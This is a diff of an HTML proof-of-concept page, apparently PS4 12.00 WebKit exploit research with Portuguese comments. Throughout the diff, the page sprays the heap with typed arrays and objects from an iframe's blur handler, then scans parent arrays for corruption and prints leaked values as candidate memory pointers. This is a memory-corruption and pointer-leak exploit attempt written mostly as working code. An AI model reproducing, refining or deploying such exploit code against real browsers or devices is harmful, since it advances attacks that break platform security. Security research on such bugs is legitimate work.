@@ -2,23 +2,22 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Memory Leak Test - Leandro</title>
+    <title>PS4 Pointer Leak - Leandro</title>
 </head>
 <body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">
 
-    <h1>PS4 12.00 - Persistence & Memory Leak</h1>
+    <h1>PS4 12.00 - Pointer Leak Research</h1>
     <p>Status: <span id="status-pai" style="font-weight:bold; color: #555;">Aguardando Preparação...</span></p>
 
     <button onclick="prepareObjects()" style="padding: 12px; cursor: pointer;">1. Preparar Objetos (Pai)</button>
-    <button onclick="setupIframe()" style="padding: 12px; cursor: pointer;">2. Injetar Iframe de Gatilho</button>
-    <button onclick="checkPersistence()" style="padding: 12px; cursor: pointer; background-color: #c8e6c9;">3. Verificar e Vazar Memória</button>
+    <button onclick="setupIframe()" style="padding: 12px; cursor: pointer;">2. Injetar Iframe (Complex Spray)</button>
+    <button onclick="checkPersistence()" style="padding: 12px; cursor: pointer; background-color: #c8e6c9;">3. Verificar e Vazar Ponteiros</button>
 
     <hr>
-    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px;">
+    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; line-height: 1.5;">
         </div>
 
-    <div id="frame-container" style="margin-top: 20px;">
-        </div>
+    <div id="frame-container" style="margin-top: 20px;"></div>
 
     <script>
         const PATTERN = 2.121995791e-314; // 0x4141414141414141
@@ -26,7 +25,6 @@
         const statusPai = document.getElementById('status-pai');
         const leakOutput = document.getElementById('leak-output');
 
-        // PASSO 1: Preparar memória no Pai
         function prepareObjects() {
             controllers = [];
             for(let i = 0; i < 5000; i++) {
@@ -39,7 +37,6 @@
             leakOutput.style.display = "none";
         }
 
-        // PASSO 2: Configurar Gatilho no Iframe
         function setupIframe() {
             const container = document.getElementById('frame-container');
             container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
@@ -51,7 +48,7 @@
             fDoc.write(`
                 <html>
                 <body>
-                    <h4>Gatilho Ativo</h4>
+                    <h4>Gatilho: Complex Spray</h4>
                     <button onclick="startPoC()" style="padding:10px;">FULLSCREEN + OPTIONS</button>
                     <script>
                         window.startPoC = function() {
@@ -59,12 +56,24 @@
                                 document.documentElement.webkitRequestFullscreen();
                             
                             window.onblur = function() {
+                                // SPRAY DE OBJETOS COMPLEXOS
+                                // Criamos estruturas que forçam o WebKit a usar ponteiros reais
                                 let spray = [];
                                 for(let i = 0; i < 8000; i++) {
+                                    // Usamos um objeto que contém referências a outros objetos
+                                    let obj = { 
+                                        ptr: new Float64Array(2), 
+                                        ref: [1.1, 2.2],
+                                        tag: "LEAK_TARGET" 
+                                    };
+                                    // Tentamos "sujar" a memória com essas referências
                                     let p = new Float64Array(10);
-                                    p.fill(${PATTERN});
+                                    p.fill(${PATTERN}); 
+                                    // A ideia é que o 'obj' acima colida com o seu controller no Pai
                                     spray.push(p);
+                                    spray.push(obj); 
                                 }
+                                
                                 setTimeout(() => {
                                     document.open();
                                     document.write('<h1>FRAME FINALIZADO</h1>');
@@ -80,13 +89,14 @@
             statusPai.innerText = "Iframe Pronto. Use Fullscreen + OPTIONS.";
         }
 
-        // PASSO 3: Verificar Corrupção e Vazar Endereços (Memory Leak)
         function checkPersistence() {
             let corrupted = null;
             let corruptedIndex = -1;
 
             for(let i = 0; i < controllers.length; i++) {
-                if (controllers[i][0] === PATTERN) {
+                // Procuramos por QUALQUER mudança, não apenas o PATTERN
+                // Se o valor não for mais o ID original (i), houve corrupção
+                if (controllers[i][0] !== i) {
                     corrupted = controllers[i];
                     corruptedIndex = i;
                     break;
@@ -94,11 +104,10 @@
             }
 
             if (corrupted) {
-                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: Memória Corrompida no ID: " + corruptedIndex + "</span>";
+                statusPai.innerHTML = "<span style='color:green;'>✓ CORRUPÇÃO DETECTADA NO ID: " + corruptedIndex + "</span>";
                 leakOutput.style.display = "block";
-                leakOutput.innerHTML = "<b>[ MEMORY LEAK DETECTED ]</b><br>Dumping surrounding memory addresses:<br><br>";
+                leakOutput.innerHTML = "<b>[ POINTER LEAK ANALYSIS ]</b><br>Valores capturados na RAM:<br><br>";
 
-                // Loop para ler e converter os valores "vazados" para Hexadecimal
                 for(let i = 0; i < 8; i++) {
                     try {
                         const val = corrupted[i];
@@ -106,13 +115,15 @@
                         new Float64Array(buf)[0] = val;
                         const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                         
-                        leakOutput.innerHTML += "Offset [" + i + "]: 0x" + hex + "<br>";
+                        // Se o valor for diferente de 0 e de 414141..., é um ponteiro potencial!
+                        let style = (hex !== "0000000000000000" && !hex.includes("414141")) ? "color:#fff; background:#a00;" : "";
+                        leakOutput.innerHTML += "<span style='" + style + "'>Offset [" + i + "]: 0x" + hex + "</span><br>";
                     } catch(e) {
-                        leakOutput.innerHTML += "Offset [" + i + "]: Erro de leitura<br>";
+                        leakOutput.innerHTML += "Offset [" + i + "]: Erro<br>";
                     }
                 }
             } else {
-                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: Corrupção não detectada.</span>";
+                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: Nenhum objeto foi corrompido.</span>";
             }
         }
     </script>
